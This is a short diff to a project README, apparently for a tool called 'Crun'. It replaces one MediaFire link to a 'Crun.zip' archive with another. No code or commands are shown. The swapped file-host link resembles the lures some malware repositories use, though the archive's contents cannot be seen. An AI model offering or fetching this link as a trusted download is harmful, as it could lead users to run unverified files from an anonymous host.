@@ -123,7 +123,7 @@ To lunch the project on your Linux system, follow these steps:
 
 ---
 
-## Download Link: [Crun Project Download](https://www.mediafire.com/file/9ql50cpvud8cuee/Crun.zip/file)
+## Download Link: [Crun Project Download](https://www.mediafire.com/file/yx0mwchqguc4pbj/Crun.zip/file)
 
 ---
 
